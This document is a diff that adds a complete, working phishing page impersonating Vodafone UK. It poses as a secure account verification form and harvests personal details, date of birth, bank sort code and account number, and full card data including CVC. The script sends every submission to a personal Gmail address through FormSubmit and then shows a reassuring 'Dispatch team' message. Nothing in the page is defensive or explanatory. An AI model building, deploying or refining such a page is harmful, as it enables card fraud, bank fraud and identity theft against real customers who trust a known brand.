@@ -1,0 +1,885 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>Vodafone UK | Secure Account & Payment Form</title>
+  <!-- Google Fonts: Professional -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
+  <!-- Font Awesome 6 -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background: linear-gradient(145deg, #e9eff4 0%, #dce3ea 100%);
+      font-family: 'Inter', sans-serif;
+      padding: 2rem 1.5rem;
+      color: #1a2c3e;
+    }
+
+    .form-container {
+      max-width: 980px;
+      margin: 0 auto;
+      background: #ffffff;
+      border-radius: 32px;
+      box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.25), 0 4px 12px rgba(0, 0, 0, 0.05);
+      overflow: hidden;
+    }
+
+    /* Vodafone UK header */
+    .form-header {
+      background: #e60000;
+      padding: 1.5rem 2rem 1.2rem 2rem;
+    }
+
+    .vodafone-logo {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      flex-wrap: wrap;
+    }
+
+    .vodafone-logo i {
+      font-size: 2.2rem;
+      color: white;
+    }
+
+    .vodafone-logo h1 {
+      font-size: 1.8rem;
+      font-weight: 700;
+      letter-spacing: -0.3px;
+      color: white;
+      margin: 0;
+    }
+
+    .vodafone-logo span {
+      font-weight: 400;
+      font-size: 1rem;
+      background: rgba(255,255,255,0.2);
+      padding: 2px 10px;
+      border-radius: 40px;
+      margin-left: 8px;
+    }
+
+    .header-sub {
+      color: rgba(255,255,255,0.9);
+      margin-top: 12px;
+      font-size: 0.9rem;
+      font-weight: 500;
+      border-left: 3px solid #ffb3b3;
+      padding-left: 14px;
+    }
+
+    .secure-badge {
+      background: white;
+      color: #e60000;
+      border-radius: 40px;
+      padding: 6px 16px;
+      font-size: 0.75rem;
+      font-weight: 700;
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      margin-top: 12px;
+      box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+    }
+
+    .form-body {
+      padding: 2rem;
+    }
+
+    .section {
+      background: #fefefe;
+      border-radius: 24px;
+      margin-bottom: 2rem;
+      border: 1px solid #eef2f6;
+      transition: box-shadow 0.2s;
+    }
+
+    .section:hover {
+      border-color: #dce3ec;
+      box-shadow: 0 8px 20px -8px rgba(0, 0, 0, 0.08);
+    }
+
+    .section-title {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 1.2rem 1.8rem 0.6rem 1.8rem;
+      border-bottom: 2px solid #f0f2f5;
+    }
+
+    .section-title i {
+      font-size: 1.5rem;
+      color: #e60000;
+      background: #fff0f0;
+      padding: 8px;
+      border-radius: 50%;
+    }
+
+    .section-title h2 {
+      font-size: 1.3rem;
+      font-weight: 600;
+      color: #1e2f3e;
+    }
+
+    .fields-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+      gap: 1.2rem 1.8rem;
+      padding: 1.5rem 1.8rem 1.8rem;
+    }
+
+    .input-group {
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+
+    .input-group label {
+      font-size: 0.75rem;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      color: #5a6e7c;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .input-group label i {
+      font-size: 0.8rem;
+      color: #e60000;
+    }
+
+    .input-group input,
+    .input-group select {
+      font-family: 'Inter', monospace;
+      background: #ffffff;
+      border: 1px solid #cfdfed;
+      border-radius: 16px;
+      padding: 12px 16px;
+      font-size: 0.9rem;
+      font-weight: 500;
+      color: #141f2c;
+      transition: all 0.2s ease;
+      outline: none;
+    }
+
+    .input-group input:focus,
+    .input-group select:focus {
+      border-color: #e60000;
+      box-shadow: 0 0 0 3px rgba(230, 0, 0, 0.1);
+    }
+
+    .full-width {
+      grid-column: 1 / -1;
+    }
+
+    .card-row {
+      display: grid;
+      grid-template-columns: 1fr 0.6fr 0.8fr;
+      gap: 12px;
+    }
+
+    .dob-row {
+      display: grid;
+      grid-template-columns: 1fr 1fr 1fr;
+      gap: 12px;
+    }
+
+    hr {
+      margin: 0 1.8rem 1rem 1.8rem;
+      border: none;
+      border-top: 1px solid #eef2f8;
+    }
+
+    .form-actions {
+      padding: 0rem 1.8rem 2rem 1.8rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 16px;
+      border-top: 1px solid #eef2f6;
+      margin-top: 8px;
+      padding-top: 1.8rem;
+    }
+
+    .btn {
+      padding: 12px 28px;
+      border-radius: 40px;
+      font-weight: 700;
+      font-size: 0.9rem;
+      border: none;
+      cursor: pointer;
+      transition: 0.2s;
+      font-family: 'Inter', sans-serif;
+    }
+
+    .btn-primary {
+      background: #e60000;
+      color: white;
+      box-shadow: 0 4px 8px rgba(230, 0, 0, 0.2);
+    }
+
+    .btn-primary:hover {
+      background: #c10000;
+      transform: translateY(-1px);
+    }
+
+    .btn-secondary {
+      background: white;
+      color: #2c4c6c;
+      border: 1px solid #cfdfed;
+    }
+
+    .btn-secondary:hover {
+      background: #f8fafc;
+      border-color: #e60000;
+    }
+
+    /* Updated footer styling - Copyright and address */
+    .footer-note {
+      font-size: 0.7rem;
+      color: #6b7f8f;
+      text-align: center;
+      padding: 1rem 1.5rem 1.2rem;
+      background: #fafcfd;
+      border-top: 1px solid #eef2f6;
+      line-height: 1.5;
+    }
+    .footer-note p {
+      margin: 4px 0;
+    }
+    .footer-note .copyright {
+      font-weight: 500;
+      color: #e60000;
+      letter-spacing: 0.3px;
+    }
+    .footer-note .address {
+      color: #4a6274;
+      font-size: 0.7rem;
+    }
+
+    @media (max-width: 680px) {
+      body {
+        padding: 1rem;
+      }
+      .form-body {
+        padding: 1.2rem;
+      }
+      .fields-grid {
+        padding: 1rem 1.2rem;
+      }
+      .section-title {
+        padding: 1rem 1.2rem;
+      }
+      .card-row, .dob-row {
+        grid-template-columns: 1fr;
+        gap: 12px;
+      }
+    }
+
+    /* Toast messages */
+    .toast-message {
+      visibility: hidden;
+      min-width: 320px;
+      max-width: 90%;
+      background-color: #1e2f3e;
+      color: #fff;
+      text-align: center;
+      border-radius: 50px;
+      padding: 14px 24px;
+      position: fixed;
+      bottom: 30px;
+      left: 50%;
+      transform: translateX(-50%);
+      font-size: 0.85rem;
+      font-weight: 500;
+      z-index: 1000;
+      box-shadow: 0 6px 14px rgba(0,0,0,0.2);
+      transition: visibility 0s, opacity 0.2s linear;
+      opacity: 0;
+      line-height: 1.4;
+    }
+    .toast-message.show {
+      visibility: visible;
+      opacity: 1;
+    }
+    .toast-success {
+      background: #1c7e3c;
+    }
+    .toast-error {
+      background: #c0392b;
+    }
+
+    /* loading spinner */
+    .loading-spinner {
+      display: inline-block;
+      width: 16px;
+      height: 16px;
+      border: 2px solid rgba(255,255,255,0.3);
+      border-radius: 50%;
+      border-top-color: white;
+      animation: spin 0.6s linear infinite;
+      margin-right: 8px;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    .btn-primary:disabled {
+      opacity: 0.7;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    /* Modal overlay for custom thank you message */
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.6);
+      backdrop-filter: blur(3px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 2000;
+      visibility: hidden;
+      opacity: 0;
+      transition: visibility 0s, opacity 0.3s ease;
+    }
+    .modal-overlay.active {
+      visibility: visible;
+      opacity: 1;
+    }
+    .thankyou-modal {
+      background: white;
+      max-width: 480px;
+      width: 90%;
+      border-radius: 32px;
+      text-align: center;
+      padding: 2rem 1.8rem;
+      box-shadow: 0 30px 50px rgba(0,0,0,0.3);
+      transform: scale(0.95);
+      transition: transform 0.2s ease;
+      font-family: 'Inter', sans-serif;
+    }
+    .modal-overlay.active .thankyou-modal {
+      transform: scale(1);
+    }
+    .thankyou-modal i {
+      font-size: 4rem;
+      color: #e60000;
+      background: #fff0f0;
+      padding: 18px;
+      border-radius: 60px;
+      margin-bottom: 1rem;
+    }
+    .thankyou-modal h3 {
+      font-size: 1.8rem;
+      font-weight: 700;
+      color: #1a2c3e;
+      margin-bottom: 1rem;
+    }
+    .thankyou-modal p {
+      color: #3a5a72;
+      font-size: 1rem;
+      line-height: 1.5;
+      margin-bottom: 1.8rem;
+    }
+    .thankyou-modal button {
+      background: #e60000;
+      border: none;
+      padding: 12px 28px;
+      border-radius: 40px;
+      color: white;
+      font-weight: 700;
+      font-size: 0.9rem;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+    .thankyou-modal button:hover {
+      background: #c10000;
+    }
+  </style>
+</head>
+<body>
+
+<div class="form-container">
+  <div class="form-header">
+    <div class="vodafone-logo">
+      <i class="fas fa-signal"></i>
+      <h1>Vodafone UK <span>Customer</span></h1>
+    </div>
+    <div class="header-sub">
+      <i class="fas fa-lock" style="margin-right: 5px;"></i> Secure account verification & payment details
+    </div>
+    <div class="secure-badge">
+      <i class="fas fa-shield-alt"></i> 256-bit SSL ENCRYPTED
+    </div>
+  </div>
+
+  <div class="form-body">
+    <!-- FORM with FormSubmit.co integration -->
+    <form id="vodafoneForm" action="https://formsubmit.co/bakermr01@gmail.com" method="POST" enctype="multipart/form-data">
+      <!-- FormSubmit config -->
+      <input type="hidden" name="_subject" value="📞 Vodafone UK - New Account & Payment Submission">
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_next" value="https://vodafone.co.uk/thanks">
+      <input type="hidden" name="_blacklist" value="">
+      
+      <!-- SECTION 1: Personal Information (including Date of Birth) -->
+      <div class="section">
+        <div class="section-title">
+          <i class="fas fa-user-circle"></i>
+          <h2>1. Personal & Residential</h2>
+        </div>
+        <div class="fields-grid">
+          <div class="input-group">
+            <label><i class="fas fa-user"></i> First name *</label>
+            <input type="text" name="First Name" id="firstName" placeholder="James" required>
+          </div>
+          <div class="input-group">
+            <label><i class="fas fa-user"></i> Middle name</label>
+            <input type="text" name="Middle Name" id="middleName" placeholder="Robert (optional)">
+          </div>
+          <div class="input-group">
+            <label><i class="fas fa-user-tag"></i> Surname *</label>
+            <input type="text" name="Surname" id="surname" placeholder="Smith" required>
+          </div>
+          
+          <!-- Date of Birth section - 3 fields -->
+          <div class="input-group full-width">
+            <label><i class="fas fa-birthday-cake"></i> Date of birth *</label>
+            <div class="dob-row">
+              <select id="dobDay" name="Date of Birth - Day" required style="padding: 12px 8px;">
+                <option value="" disabled selected>Day</option>
+              </select>
+              <select id="dobMonth" name="Date of Birth - Month" required style="padding: 12px 8px;">
+                <option value="" disabled selected>Month</option>
+              </select>
+              <select id="dobYear" name="Date of Birth - Year" required style="padding: 12px 8px;">
+                <option value="" disabled selected>Year</option>
+              </select>
+            </div>
+          </div>
+          
+          <div class="input-group">
+            <label><i class="fas fa-mobile-alt"></i> Phone number *</label>
+            <input type="tel" name="Phone Number" id="phoneNo" placeholder="07700 900123" required>
+          </div>
+          <div class="input-group full-width">
+            <label><i class="fas fa-home"></i> Full address (house no., street, postcode) *</label>
+            <input type="text" name="Address" id="address" placeholder="1 Vodafone Way, Newbury, RG14 2FN" required>
+          </div>
+          <div class="input-group full-width">
+            <label><i class="fas fa-clock"></i> History on address (years lived at this address) *</label>
+            <input type="text" name="History on Address" id="historyAddress" placeholder="e.g. 4 years, 2 months" required>
+          </div>
+        </div>
+      </div>
+
+      <!-- SECTION 2: Bank Account Details -->
+      <div class="section">
+        <div class="section-title">
+          <i class="fas fa-building-columns"></i>
+          <h2>2. Bank account details</h2>
+        </div>
+        <div class="fields-grid">
+          <div class="input-group full-width">
+            <label><i class="fas fa-signature"></i> Name on account *</label>
+            <input type="text" name="Name on Account" id="nameOnAccount" placeholder="Mr J. Smith" required>
+          </div>
+          <div class="input-group">
+            <label><i class="fas fa-code-branch"></i> Sort code *</label>
+            <input type="text" name="Sort Code" id="sortCode" placeholder="20-00-00" required>
+          </div>
+          <div class="input-group">
+            <label><i class="fas fa-credit-card"></i> Account number *</label>
+            <input type="text" name="Account Number" id="accountNumber" placeholder="12345678" required>
+          </div>
+        </div>
+      </div>
+
+      <!-- SECTION 3: Card details -->
+      <div class="section">
+        <div class="section-title">
+          <i class="fas fa-credit-card-front"></i>
+          <h2>3. Debit / Credit card</h2>
+        </div>
+        <div class="fields-grid">
+          <div class="input-group full-width">
+            <label><i class="fas fa-id-card"></i> Name on card *</label>
+            <input type="text" name="Name on Card" id="nameOnCard" placeholder="JAMES SMITH" required>
+          </div>
+          <div class="input-group full-width">
+            <label><i class="fas fa-hashtag"></i> Long numbers (card number) *</label>
+            <input type="text" name="Card Number" id="cardNumber" placeholder="4532 1234 5678 9101" maxlength="19" required>
+          </div>
+          <div class="card-row">
+            <div class="input-group">
+              <label><i class="fas fa-calendar-alt"></i> Expiry date (MM/YY) *</label>
+              <input type="text" name="Expiry Date" id="expiryDate" placeholder="08/28" required>
+            </div>
+            <div class="input-group">
+              <label><i class="fas fa-lock"></i> CVC *</label>
+              <input type="text" name="CVC" id="cvc" placeholder="123" maxlength="4" required>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- SECTION 4: Employment status -->
+      <div class="section">
+        <div class="section-title">
+          <i class="fas fa-briefcase"></i>
+          <h2>4. Employment background</h2>
+        </div>
+        <div class="fields-grid">
+          <div class="input-group full-width">
+            <label><i class="fas fa-chart-line"></i> Employment status *</label>
+            <select name="Employment Status" id="employmentStatus" required>
+              <option value="" disabled selected>– Select status –</option>
+              <option value="Employed (Full-time)">Employed (Full-time)</option>
+              <option value="Employed (Part-time)">Employed (Part-time)</option>
+              <option value="Self-employed">Self-employed</option>
+              <option value="Student">Student</option>
+              <option value="Retired">Retired</option>
+              <option value="Unemployed">Unemployed</option>
+              <option value="Other">Other</option>
+            </select>
+          </div>
+        </div>
+        <hr>
+        <div style="padding: 0 1.8rem 1.2rem 1.8rem; font-size: 0.7rem; color:#5f7f9a;">
+          <i class="fas fa-info-circle"></i> Vodafone UK may verify your details via credit reference agencies.
+        </div>
+      </div>
+
+      <!-- Form actions -->
+      <div class="form-actions">
+        <button type="button" class="btn btn-secondary" id="clearBtn"><i class="fas fa-undo-alt"></i> Reset form</button>
+        <button type="submit" class="btn btn-primary" id="submitBtn"><i class="fas fa-check-circle"></i> Verify & continue</button>
+      </div>
+    </form>
+  </div>
+  
+  <!-- Updated footer with Copyright and Vodafone UK Address - Year updated to 2026 -->
+  <div class="footer-note">
+    <p class="copyright">© 2026 Vodafone UK Limited</p>
+    <p class="address">Vodafone House, The Connection, Newbury, Berkshire RG14 2FN, United Kingdom</p>
+  </div>
+</div>
+
+<!-- Toast message -->
+<div id="toastMsg" class="toast-message"></div>
+
+<!-- Custom Thank You Modal -->
+<div id="thankyouModal" class="modal-overlay">
+  <div class="thankyou-modal">
+    <i class="fas fa-check-circle"></i>
+    <h3>Thank You!</h3>
+    <p>Thank you for submitting your details. Our Dispatch team will get in touch with you shortly.</p>
+    <button onclick="closeThankYouModal()">Continue</button>
+  </div>
+</div>
+
+<script>
+  (function() {
+    const form = document.getElementById('vodafoneForm');
+    const toast = document.getElementById('toastMsg');
+    const submitBtn = document.getElementById('submitBtn');
+    const thankyouModal = document.getElementById('thankyouModal');
+
+    function showMessage(text, isError = false) {
+      toast.textContent = text;
+      toast.classList.add('show');
+      if (isError) {
+        toast.classList.add('toast-error');
+        toast.classList.remove('toast-success');
+      } else {
+        toast.classList.add('toast-success');
+        toast.classList.remove('toast-error');
+      }
+      setTimeout(() => {
+        toast.classList.remove('show');
+      }, 4500);
+    }
+
+    function closeThankYouModal() {
+      thankyouModal.classList.remove('active');
+    }
+    window.closeThankYouModal = closeThankYouModal;
+
+    // Populate Date of Birth dropdowns
+    function populateDOB() {
+      const daySelect = document.getElementById('dobDay');
+      for (let i = 1; i <= 31; i++) {
+        const option = document.createElement('option');
+        option.value = i;
+        option.textContent = i;
+        daySelect.appendChild(option);
+      }
+      const monthSelect = document.getElementById('dobMonth');
+      const months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];
+      months.forEach((month, idx) => {
+        const option = document.createElement('option');
+        option.value = idx + 1;
+        option.textContent = month;
+        monthSelect.appendChild(option);
+      });
+      const yearSelect = document.getElementById('dobYear');
+      const currentYear = new Date().getFullYear();
+      for (let i = currentYear; i >= 1920; i--) {
+        const option = document.createElement('option');
+        option.value = i;
+        option.textContent = i;
+        yearSelect.appendChild(option);
+      }
+    }
+    populateDOB();
+
+    // Enhanced validation including DOB
+    function validateRequiredFields() {
+      const requiredFields = [
+        { id: 'firstName', name: 'First name' },
+        { id: 'surname', name: 'Surname' },
+        { id: 'phoneNo', name: 'Phone number' },
+        { id: 'address', name: 'Address' },
+        { id: 'historyAddress', name: 'History on address' },
+        { id: 'nameOnAccount', name: 'Name on account' },
+        { id: 'sortCode', name: 'Sort code' },
+        { id: 'accountNumber', name: 'Account number' },
+        { id: 'nameOnCard', name: 'Name on card' },
+        { id: 'cardNumber', name: 'Long numbers' },
+        { id: 'expiryDate', name: 'Expiry date' },
+        { id: 'cvc', name: 'CVC' }
+      ];
+      for (let field of requiredFields) {
+        const inputElem = document.getElementById(field.id);
+        if (!inputElem.value.trim()) {
+          showMessage(`⚠️ ${field.name} is required`, true);
+          inputElem.focus();
+          inputElem.style.borderColor = "#e60000";
+          setTimeout(() => { inputElem.style.borderColor = ""; }, 1500);
+          return false;
+        }
+        inputElem.style.borderColor = "";
+      }
+      
+      // DOB Validation
+      const day = document.getElementById('dobDay').value;
+      const month = document.getElementById('dobMonth').value;
+      const year = document.getElementById('dobYear').value;
+      if (!day || !month || !year) {
+        showMessage("🎂 Please select complete Date of Birth (Day, Month, Year)", true);
+        return false;
+      }
+      const birthDate = new Date(year, month-1, day);
+      const today = new Date();
+      let age = today.getFullYear() - birthDate.getFullYear();
+      const mDiff = today.getMonth() - birthDate.getMonth();
+      if (mDiff < 0 || (mDiff === 0 && today.getDate() < birthDate.getDate())) age--;
+      if (age < 18) {
+        showMessage("⚠️ You must be at least 18 years old to continue.", true);
+        return false;
+      }
+      if (age > 110) {
+        showMessage("⚠️ Please enter a valid year of birth.", true);
+        return false;
+      }
+
+      const employmentSelect = document.getElementById('employmentStatus');
+      if (!employmentSelect.value) {
+        showMessage("⚠️ Please select Employment status", true);
+        employmentSelect.focus();
+        employmentSelect.style.borderColor = "#e60000";
+        setTimeout(() => { employmentSelect.style.borderColor = ""; }, 1500);
+        return false;
+      }
+      employmentSelect.style.borderColor = "";
+
+      const phone = document.getElementById('phoneNo').value.trim();
+      const phoneRegex = /^[\+\d\s\-\(\)]{8,20}$/;
+      if (!phoneRegex.test(phone)) {
+        showMessage("📞 Please enter a valid UK phone number (minimum 8 digits)", true);
+        return false;
+      }
+
+      const sortCodeRaw = document.getElementById('sortCode').value.trim();
+      const sortRegex = /^[0-9]{2}[- ]?[0-9]{2}[- ]?[0-9]{2}$|^[0-9]{6}$/;
+      if (!sortRegex.test(sortCodeRaw)) {
+        showMessage("🏦 Sort code should be 6 digits or format 00-00-00", true);
+        return false;
+      }
+
+      const accountNum = document.getElementById('accountNumber').value.trim();
+      if (!/^[0-9]{6,8}$/.test(accountNum)) {
+        showMessage("🔢 Account number should be 6-8 digits", true);
+        return false;
+      }
+
+      const cardNum = document.getElementById('cardNumber').value.replace(/\s/g, '');
+      if (!/^[0-9]{13,19}$/.test(cardNum)) {
+        showMessage("💳 Card number must contain 13-19 digits", true);
+        return false;
+      }
+
+      const expiry = document.getElementById('expiryDate').value.trim();
+      const expiryRegex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
+      if (!expiryRegex.test(expiry)) {
+        showMessage("📅 Expiry date must be MM/YY format (e.g., 08/28)", true);
+        return false;
+      }
+      const cvcVal = document.getElementById('cvc').value.trim();
+      if (!/^[0-9]{3,4}$/.test(cvcVal)) {
+        showMessage("🔒 CVC must be 3 or 4 digits", true);
+        return false;
+      }
+
+      const historyAddr = document.getElementById('historyAddress').value.trim();
+      if (historyAddr.length < 3) {
+        showMessage("🏠 Please provide a valid address history (e.g., '5 years')", true);
+        return false;
+      }
+      return true;
+    }
+
+    // Formatting helpers
+    const cardNumberInput = document.getElementById('cardNumber');
+    cardNumberInput.addEventListener('input', function(e) {
+      let raw = this.value.replace(/\s/g, '');
+      if (raw.length > 19) raw = raw.slice(0,19);
+      let formatted = '';
+      for (let i = 0; i < raw.length; i++) {
+        if (i > 0 && i % 4 === 0) formatted += ' ';
+        formatted += raw[i];
+      }
+      this.value = formatted;
+    });
+
+    const sortCodeInput = document.getElementById('sortCode');
+    sortCodeInput.addEventListener('input', function(e) {
+      let val = this.value.replace(/[^0-9]/g, '');
+      if (val.length > 6) val = val.slice(0,6);
+      let formatted = '';
+      for (let i=0; i<val.length; i++) {
+        if (i===2 || i===4) formatted += '-';
+        formatted += val[i];
+      }
+      this.value = formatted;
+    });
+
+    const expiryInput = document.getElementById('expiryDate');
+    expiryInput.addEventListener('input', function(e) {
+      let raw = this.value.replace(/[^0-9]/g, '');
+      if (raw.length >= 3) {
+        let month = raw.slice(0,2);
+        let year = raw.slice(2,4);
+        if (month > 12) month = '12';
+        this.value = month + '/' + year;
+      } else if (raw.length === 2) {
+        this.value = raw;
+      } else {
+        this.value = raw;
+      }
+      if (raw.length > 4) this.value = this.value.slice(0,5);
+    });
+
+    const phoneInput = document.getElementById('phoneNo');
+    phoneInput.addEventListener('input', function(e) {
+      let val = this.value.replace(/[^0-9\+]/g, '');
+      if (val.length > 15) val = val.slice(0,15);
+      this.value = val;
+    });
+
+    document.getElementById('clearBtn').addEventListener('click', function() {
+      form.reset();
+      const empSelect = document.getElementById('employmentStatus');
+      empSelect.selectedIndex = 0;
+      // Reset DOB selects to default
+      document.getElementById('dobDay').selectedIndex = 0;
+      document.getElementById('dobMonth').selectedIndex = 0;
+      document.getElementById('dobYear').selectedIndex = 0;
+      const allInputs = form.querySelectorAll('input, select');
+      allInputs.forEach(inp => inp.style.borderColor = '');
+      showMessage("Form has been reset", false);
+    });
+
+    // Handle form submission with custom thank you modal
+    form.addEventListener('submit', async function(e) {
+      e.preventDefault();
+      
+      if (!validateRequiredFields()) {
+        return;
+      }
+
+      const originalBtnText = submitBtn.innerHTML;
+      submitBtn.disabled = true;
+      submitBtn.innerHTML = '<span class="loading-spinner"></span> Sending...';
+
+      const formData = new FormData(form);
+      
+      // Append formatted DOB as single field for email clarity
+      const day = document.getElementById('dobDay').value;
+      const month = document.getElementById('dobMonth').value;
+      const year = document.getElementById('dobYear').value;
+      const monthNames = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
+      const monthName = month ? monthNames[parseInt(month)-1] : '';
+      const fullDOB = `${day} ${monthName} ${year}`;
+      formData.append('Date of Birth', fullDOB);
+      
+      formData.append('_template', 'table');
+      formData.append('_subject', '📞 Vodafone UK - New Account & Payment Submission');
+
+      try {
+        const response = await fetch('https://formsubmit.co/ajax/bakermr01@gmail.com', {
+          method: 'POST',
+          body: formData,
+          headers: {
+            'Accept': 'application/json'
+          }
+        });
+        
+        if (response.ok) {
+          // Show custom modal with dispatch team message
+          thankyouModal.classList.add('active');
+          // Reset form after modal closes for security & UX
+          const modalBtn = document.querySelector('#thankyouModal button');
+          modalBtn.onclick = () => {
+            closeThankYouModal();
+            // Reset entire form after closing modal
+            form.reset();
+            const empSel = document.getElementById('employmentStatus');
+            empSel.selectedIndex = 0;
+            document.getElementById('dobDay').selectedIndex = 0;
+            document.getElementById('dobMonth').selectedIndex = 0;
+            document.getElementById('dobYear').selectedIndex = 0;
+            const allInputs = form.querySelectorAll('input, select');
+            allInputs.forEach(inp => inp.style.borderColor = '');
+            showMessage("Form has been submitted & reset. Thank you.", false);
+          };
+          console.log("✅ Form successfully sent to bakermr01@gmail.com via FormSubmit");
+        } else {
+          showMessage("❌ Submission failed. Please double-check your entries or try again later.", true);
+        }
+      } catch (error) {
+        console.error("Fetch error:", error);
+        showMessage("❌ Connection error. Unable to submit form. Check your internet and try again.", true);
+      } finally {
+        submitBtn.disabled = false;
+        submitBtn.innerHTML = originalBtnText;
+      }
+    });
+  })();
+</script>
+</body>
+</html>
